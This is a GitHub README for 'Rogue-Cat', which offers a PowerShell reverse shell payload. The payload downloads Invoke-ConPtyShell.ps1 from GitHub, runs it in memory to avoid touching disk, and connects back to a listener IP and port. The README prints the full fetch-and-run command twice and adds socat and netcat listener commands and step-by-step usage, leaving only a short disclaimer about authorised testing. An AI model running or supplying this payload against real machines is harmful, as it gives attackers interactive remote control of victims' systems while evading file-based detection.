# 🐾 Rogue-Cat

<div align="center">

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue.svg)](https://github.com/PowerShell/PowerShell)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Type](https://img.shields.io/badge/Type-Interactive%20Reverse%20Shell-red.svg)](https://github.com/infinite667/Rogue-Cat)

*An interactive Windows Pseudo Console (ConPTY) reverse shell payload runner leveraging fileless execution.*

</div>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [The Payload](#-the-payload)
- [How It Works](#-how-it-works)
- [Prerequisites](#-prerequisites)
- [Usage](#-usage)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🚀 Overview

**Rogue-Cat** is a streamlined repository hosting an advanced PowerShell-based reverse shell payload. It utilizes **ConPtyShell** (`Invoke-ConPtyShell.ps1`) by `antonioCoco` to spawn a fully interactive Windows Pseudo Console (`ConPTY`) over a network socket, avoiding the limitations of legacy reverse shells.

---

## ⚡ The Payload

Copy and run the following command in a PowerShell session on the target Windows system:

```powershell
IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
⚙️ How It Works
[Target Windows System]                                      [Listener Machine]
  │                                                                │
  ├─ 1. IWR fetches Invoke-ConPtyShell.ps1 from GitHub             │
  ├─ 2. IEX executes script in-memory (Fileless)                   │
  └─ 3. Invoke-ConPtyShell opens ConPTY ────────────── (TCP) ──────► Listens on 192.168.178.118:33413
IWR (Invoke-WebRequest): Fetches the PowerShell script directly from GitHub using basic parsing for broad compatibility.

IEX (Invoke-Expression): Executes the script completely in-memory without writing any files to the target disk.

Invoke-ConPtyShell: Spawns a native Windows ConPTY instance and routes it back to the listener IP (192.168.178.118) on port (33413).

📋 Prerequisites
Windows target machine with PowerShell enabled.

Network routing/connectivity to the listener IP.

A raw socket listener set up on your machine.

💻 Usage
⚠️ Warning: This tool and script are intended strictly for educational purposes, authorized penetration testing, and CTF challenges.

Step 1: Set up a Listener
Run a raw socket handler on your machine (using socat for full terminal dimension and raw character support):

Bash
socat file:`tty`,raw,echo=0 tcp-listen:33413
(Alternatively, a standard netcat listener like nc -lvnp 33413 can be used, though terminal resizing features will be limited).

Step 2: Run the Payload
Execute the payload on the target Windows environment via PowerShell:

PowerShell
IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
⚖️ Disclaimer
The author and contributors assume no liability and are not responsible for any misuse or damage caused by this program. Use only on systems you own or have explicit, written legal permission to test.

📝 License
Distributed under the MIT License. See LICENSE for more information.
